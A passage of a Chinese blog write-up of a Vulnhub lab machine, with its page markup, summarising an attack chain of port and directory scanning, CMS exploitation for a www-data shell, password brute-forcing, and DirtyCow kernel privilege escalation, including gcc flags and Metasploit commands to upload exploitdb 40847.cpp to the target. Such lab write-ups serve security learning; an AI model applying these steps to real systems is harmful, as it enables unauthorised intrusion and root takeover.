+<li>-Wall 一般使用该选项，允许发出GCC能够提供的所有有用的警告</li>
+<li>-pedantic 允许发出ANSI/ISO C标准所列出的所有警告</li>
+<li>-O2编译器的优化选项的4个级别，-O0表示没有优化,-O1为缺省值，-O3优化级别最高</li>
+<li>-std=c++11就是用按C++2011标准来编译的</li>
+<li>-pthread 在Linux中要用到多线程时，需要链接pthread库</li>
+<li>-o dcow gcc生成的目标文件,名字为dcow</li>
+</ol>
+<p>获取到 root 的密码，通过 ssh 登录即可。</p>
+<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>1、cewl、hydra、msf 使用</p>
+<p>2、信息收集：nmap 扫描对方端口和服务，dirb 爆破网站目录</p>
+<p>3、权限获取：网站cms漏洞，得到 www-data shell；用户爆破，得到一般用户</p>
+<p>4、提权：les.sh 扫描内核漏洞，通过 dirtycow 内核漏洞提权，两机传输文件，编译、运行，得到 root shell</p>
+<p>5、完整的渗透流程：外网 -&gt; 内网（网站漏洞 -&gt; www-data shell -&gt; 内核扫描 -&gt; 内核漏洞 -&gt; 内核提权）</p>
+<p>6、网站扫描：2类工具（扫描类AWVS、爬虫类xray（ddosi））</p>
+<h2 id="五、其他"><a href="#五、其他" class="headerlink" title="五、其他"></a>五、其他</h2><p><strong>Metasploit—上传/下载文件：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> upload file      <span class="hljs-comment">#向目标系统上传文件</span></span><br><span class="hljs-meta">$</span><span class="bash"> download file    <span class="hljs-comment">#从目标系统中下载文件</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 按 ctrl+c 返回控制台</span><br><span class="hljs-meta">#</span><span class="bash"> upload （from 本机文件路径） （to 目标路径）</span><br><span class="hljs-meta">#</span><span class="bash"> 执行命令上传cpp文件到/tmp目录下，因为该目录一般可写</span><br><span class="hljs-meta">$</span><span class="bash"> upload /usr/share/exploitdb/exploits/linux/<span class="hljs-built_in">local</span>/40847.cpp /tmp</span><br></code></pre></td></tr></table></figure>
+<p><strong>SSH—拷贝文件：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> scp file user@ip:/tmp</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 拷贝文件夹</span><br><span class="hljs-meta">#</span><span class="bash"> 把当前文件夹tempA拷贝到目标服务器10.127.40.25 服务器的 /tmp/wang/文件夹下</span><br><span class="hljs-meta">#</span><span class="bash"> 其中wasadmin是目标服务器的用户名，执行命令提示输入密码，然后输入密码即可</span><br><span class="hljs-meta">$</span><span class="bash"> scp -r /tmp/tempA/ wasadmin@10.127.40.25:/tmp/wang/</span> <br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 拷贝文件</span><br><span class="hljs-meta">#</span><span class="bash"> 把当前文件tempA.txt拷贝到目标服务器10.127.40.25 服务器的 /tmp/wang/文件夹下</span><br><span class="hljs-meta">$</span><span class="bash"> scp /tmp/tempA.txt wasadmin@10.127.40.25:/tmp/wang/</span><br></code></pre></td></tr></table></figure>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Penetration/">Penetration</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Penetration/">Penetration</a>
+                    
+                      <a class="hover-with-bg" href="/tags/vulnhub/">vulnhub</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/05/01/Penetration/Vulnhub/Part-1/0x02%20W1R3S/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">W1R3S：1.0.1</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/04/24/Linux/Kali/Kali/">
+                        <span class="hidden-mobile">Kali</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
